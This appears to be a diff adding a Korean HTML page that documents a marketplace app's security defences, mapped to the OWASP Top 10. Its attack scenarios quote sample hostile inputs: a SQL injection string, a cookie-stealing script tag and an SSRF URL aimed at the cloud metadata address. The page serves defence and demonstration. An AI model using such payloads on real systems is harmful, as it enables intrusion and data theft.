+      <div class="row"><span class="lbl">공격</span><span class="val example">로그인 폼에 <b>email: admin' OR 1=1 --</b> 입력 → 옛날 시스템이면 SQL이 <b>SELECT * FROM users WHERE email='admin' OR 1=1 --'</b>로 실행돼서 모든 계정 통과. + 주문 상세 URL의 ID만 바꿔서 다른 사람 주문 훔쳐보기 (IDOR).</span></div>
+      <div class="row"><span class="lbl">우리</span><span class="val defense"><b>2겹 방어</b>: ① Supabase ORM이 모든 입력을 Prepared Statement로 처리 → 마법 주문이 그냥 글자로 됨. ② RLS 정책: orders 테이블 select 시 자동으로 <b>buyer_id = auth.uid()</b> 조건 강제. 다른 사람 주문은 DB에서 안 보임.</span></div>
+
+      <div class="files">
+        <div class="lbl-top">코드 위치</div>
+        <span class="file">supabase/migrations/0001_init.sql — 모든 테이블 RLS enable + 정책</span>
+        <span class="file">supabase/migrations/0002_fix_rls_recursion.sql — is_admin() helper</span>
+        <span class="file">/api/products<span class="line">:22-26</span> — SQLi 데모 (' OR 1=1 --도 안전)</span>
+      </div>
+
+      <div class="row" style="margin-top:14px;">
+        <span class="lbl">RLS 정책 예</span>
+        <span class="val" style="font-family: ui-monospace, monospace; font-size: 11px; line-height: 1.7;">
+          • <b>products</b>: is_approved=true OR 본인 가게 OR admin<br>
+          • <b>orders</b>: buyer_id = auth.uid() (본인만)<br>
+          • <b>reviews</b>: read public, write 본인만<br>
+          • <b>login_attempts</b>: service-role only
+        </span>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- 요청 한 사이클 -->
+  <h2><span class="accent"></span>요청 한 사이클 — 통과하는 보안 게이트</h2>
+  <div class="flow">
+    <div class="flow-row">
+      <div class="flow-node">
+        <div class="ico">🌐</div>
+        <div class="label">Browser</div>
+        <div class="checks">
+          ✓ sb-*-auth-token<br>
+          ✓ sogra_csrf 쿠키
+        </div>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node">
+        <div class="ico">▲</div>
+        <div class="label">Vercel Edge</div>
+        <div class="checks">
+          ✓ HTTPS only<br>
+          ✓ DDoS mitigation<br>
+          <span class="x">○ Edge cache</span>
+        </div>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node">
+        <div class="ico">🛂</div>
+        <div class="label">middleware.ts</div>
+        <div class="checks">
+          ✓ updateSession (JWT)<br>
+          ✓ ensureCsrfCookie<br>
+          ✓ /admin·/seller<br>&nbsp;&nbsp;&nbsp;진입 차단
+        </div>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node">
+        <div class="ico">⚡</div>
+        <div class="label">Route Handler</div>
+        <div class="checks">
+          ✓ verifyCsrf<br>
+          ✓ requireRole<br>
+          ✓ Zod parse<br>
+          ✓ stripHtml / sanitize<br>
+          ✓ isUrlSafe (SSRF)
+        </div>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node">
+        <div class="ico">🗄️</div>
+        <div class="label">Supabase</div>
+        <div class="checks">
+          ✓ RLS 정책 검증<br>
+          ✓ Prepared Stmt<br>
+          ✓ bcrypt (비번)
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 공격 시나리오 vs 우리 방어 -->
+  <h2><span class="accent"></span>실전 공격 시나리오 — 우리가 어디서 막는가</h2>
+
+  <div class="attack">
+    <div class="attack-head">
+      <span class="attack-num">1</span>
+      <h3>리뷰에 악성 스크립트 심기 (Stored XSS)</h3>
+    </div>
+    <div class="attack-flow">
+      <div class="attack-step bad">
+        <div class="who">공격자</div>
+        <div class="what">리뷰에 &lt;script&gt;쿠키탈취()&lt;/script&gt; 작성</div>
+      </div>
+      <div class="attack-arrow">→</div>
+      <div class="attack-step guard">
+        <div class="who">서버 (API)</div>
+        <div class="what">/api/reviews → sanitizeHtml() → script 태그 제거</div>
+      </div>
+      <div class="attack-arrow">→</div>
+      <div class="attack-step safe">
+        <div class="who">DB</div>
+        <div class="what">"평범한 텍스트"만 저장. 다음 방문자 안전</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack">
+    <div class="attack-head">
+      <span class="attack-num">2</span>
+      <h3>다른 사람 주문 훔쳐보기 (IDOR)</h3>
+    </div>
+    <div class="attack-flow">
+      <div class="attack-step bad">
+        <div class="who">공격자</div>
+        <div class="what">URL의 주문ID를 다른 사람 ID로 변경</div>
+      </div>
+      <div class="attack-arrow">→</div>
+      <div class="attack-step guard">
+        <div class="who">서버 (RSC)</div>
+        <div class="what">supabase.from(orders).select() → RLS 자동 적용</div>
+      </div>
+      <div class="attack-arrow">→</div>
+      <div class="attack-step safe">
+        <div class="who">DB</div>
+        <div class="what">buyer_id ≠ auth.uid() → 빈 결과 → 404</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack">
+    <div class="attack-head">
+      <span class="attack-num">3</span>
+      <h3>관리자 페이지 무단 진입</h3>
+    </div>
+    <div class="attack-flow">
+      <div class="attack-step bad">
+        <div class="who">공격자</div>
+        <div class="what">URL에 /admin 직접 타이핑</div>
+      </div>
+      <div class="attack-arrow">→</div>
+      <div class="attack-step guard">
+        <div class="who">middleware</div>
+        <div class="what">user.role !== 'admin' → /로 redirect</div>
+      </div>
+      <div class="attack-arrow">→</div>
+      <div class="attack-step safe">
+        <div class="who">방어</div>
+        <div class="what">+ API 호출도 requireRole에서 다시 차단</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack">
+    <div class="attack-head">
+      <span class="attack-num">4</span>
+      <h3>봇이 1초에 1000번 비번 시도</h3>
+    </div>
+    <div class="attack-flow">
+      <div class="attack-step bad">
+        <div class="who">봇</div>
+        <div class="what">POST /api/auth/login × 1000 (다양한 비번)</div>
+      </div>
+      <div class="attack-arrow">→</div>
+      <div class="attack-step guard">
+        <div class="who">서버</div>
+        <div class="what">5회 실패 누적 → checkBruteForce가 false 반환</div>
+      </div>
+      <div class="attack-arrow">→</div>
+      <div class="attack-step safe">
+        <div class="who">방어</div>
+        <div class="what">HTTP 429 + Retry-After:10 → 봇 멈춤</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack">
+    <div class="attack-head">
+      <span class="attack-num">5</span>
+      <h3>이미지 URL로 내부망 스캔 (SSRF)</h3>
+    </div>
+    <div class="attack-flow">
+      <div class="attack-step bad">
+        <div class="who">악성 셀러</div>
+        <div class="what">image_url=http://169.254.169.254/...</div>
+      </div>
+      <div class="attack-arrow">→</div>
+      <div class="attack-step guard">
+        <div class="who">서버 (API)</div>
+        <div class="what">isUrlSafe() → 화이트리스트에 없는 호스트 차단</div>
+      </div>
+      <div class="attack-arrow">→</div>
+      <div class="attack-step safe">
+        <div class="who">방어</div>
+        <div class="what">400 ssrf_blocked → AWS 메타데이터 안전</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack">
+    <div class="attack-head">
+      <span class="attack-num">6</span>
+      <h3>SQL Injection 시도</h3>
+    </div>
+    <div class="attack-flow">
+      <div class="attack-step bad">
+        <div class="who">공격자</div>
+        <div class="what">검색창에: ' OR 1=1 --</div>
+      </div>
+      <div class="attack-arrow">→</div>
+      <div class="attack-step guard">
+        <div class="who">Supabase ORM</div>
+        <div class="what">Prepared Statement → 입력을 단순 문자열로 처리</div>
+      </div>
+      <div class="attack-arrow">→</div>
+      <div class="attack-step safe">
+        <div class="who">DB</div>
+        <div class="what">WHERE name ILIKE '%'' OR 1=1 --%' → 빈 결과</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 위협 vs 모듈 매트릭스 -->
+  <h2><span class="accent"></span>위협 ↔ 적용 모듈 매트릭스 <small>OWASP Top 10 매핑</small></h2>
+  <div class="matrix">
+    <table>
+      <thead>
+        <tr>
+          <th>OWASP</th>
+          <th>위협</th>
+          <th>방어 모듈</th>
+          <th>핵심 적용 위치</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="path">A01</td>
+          <td class="threat-cell">권한 우회 (IDOR)</td>
+          <td class="module-cell">RBAC + RLS</td>
+          <td class="path">middleware + requireRole + Postgres RLS (3겹)</td>
+        </tr>
+        <tr>
+          <td class="path">A03</td>
+          <td class="threat-cell">XSS (Stored / Reflected)</td>
+          <td class="module-cell">Sanitize</td>
+          <td class="path">products·reviews·recommend route + product detail 렌더</td>
+        </tr>
+        <tr>
+          <td class="path">A03</td>
+          <td class="threat-cell">SQL Injection</td>
+          <td class="module-cell">ORM Prepared Statement + RLS</td>
+          <td class="path">Supabase 클라이언트 전역 + DB 정책</td>
+        </tr>
+        <tr>
+          <td class="path">A03</td>
+          <td class="threat-cell">프롬프트 인젝션</td>
+          <td class="module-cell">stripHtml + 후보 제한</td>
+          <td class="path">/api/recommend — Gemini 입력 정제 + 화이트리스트 product_ids</td>
+        </tr>
+        <tr>
+          <td class="path">A05</td>
+          <td class="threat-cell">악성 파일 업로드</td>
+          <td class="module-cell">Upload validator</td>
+          <td class="path">/api/upload MIME + 확장자 + 매직넘버</td>
+        </tr>
+        <tr>
+          <td class="path">A07</td>
+          <td class="threat-cell">BruteForce 비번 추측</td>
+          <td class="module-cell">login_attempts 잠금</td>
+          <td class="path">/api/auth/login 진입 가드</td>
+        </tr>
+        <tr>
+          <td class="path">A07</td>
+          <td class="threat-cell">세션 탈취 / 토큰 노출</td>
+          <td class="module-cell">HttpOnly cookies + JWT ES256</td>
+          <td class="path">@supabase/ssr 자동 + middleware updateSession</td>
+        </tr>
+        <tr>
+          <td class="path">A08</td>
+          <td class="threat-cell">CSRF</td>
+          <td class="module-cell">CSRF Double-Submit Cookie</td>
+          <td class="path">middleware + 모든 POST API route</td>
+        </tr>
+        <tr>
+          <td class="path">A10</td>
+          <td class="threat-cell">SSRF (내부망 스캔)</td>
+          <td class="module-cell">URL Allowlist</td>
+          <td class="path">/api/products image_url 검증</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- 시연 한 줄 -->
+  <h2><span class="accent"></span>시연용 한 줄 정리</h2>
+  <div style="background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 22px; font-size: 14px; line-height: 1.75;">
+    <p style="margin-bottom: 12px;">
+      <b style="color: #6ee7b7;">장터한상</b>은 사용자가 입력하는 모든 데이터(리뷰·이름·URL·비번·이미지파일)를
+      <b style="color: var(--amber);">"입구 · 중간 · 최후방"</b>
+      <b>3겹 검문</b>으로 위조·도둑·위장·인젝션을 모두 거릅니다.
+    </p>
+    <p style="color: var(--muted); font-size: 12px;">
+      OWASP Top 10 (A01·A03·A05·A07·A08·A10) 의 6개 카테고리, 9개 이상의 구체적 위협 시나리오에 대해
+      11개 코드 위치에서 7종 보안 모듈이 동작합니다. DB(Supabase RLS)는 마지막 방패로,
+      코드가 모두 뚫려도 본인 데이터 외엔 노출되지 않습니다.
+    </p>
+  </div>
+
+</div>
+</body>
+</html>
